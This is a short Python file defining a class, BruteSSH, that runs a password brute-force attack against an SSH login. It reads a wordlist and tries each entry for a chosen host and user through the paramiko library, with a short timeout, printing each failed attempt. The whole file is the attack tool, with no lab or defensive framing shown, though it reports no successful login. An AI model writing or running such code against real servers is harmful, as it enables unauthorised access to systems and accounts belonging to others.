import paramiko
from paramiko import SSHClient

class BruteSSH():
    def __init__(self, host, user, wordlist):
        self.host = host
        self.user = user
        self.wordlist = wordlist

    def Checkout(self):
        with open(self.wordlist, 'r') as wordlist:
            lines = wordlist.readlines()
            self.ssh = SSHClient()
            self.ssh.load_system_host_keys()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
            for passw in lines:
                try:
                    status = self.ssh.connect(hostname=self.host, username=self.user,\
                    password=passw.strip(), timeout=0.4)
            
                except paramiko.AuthenticationException:
                    print("failed - {0}".format(passw))
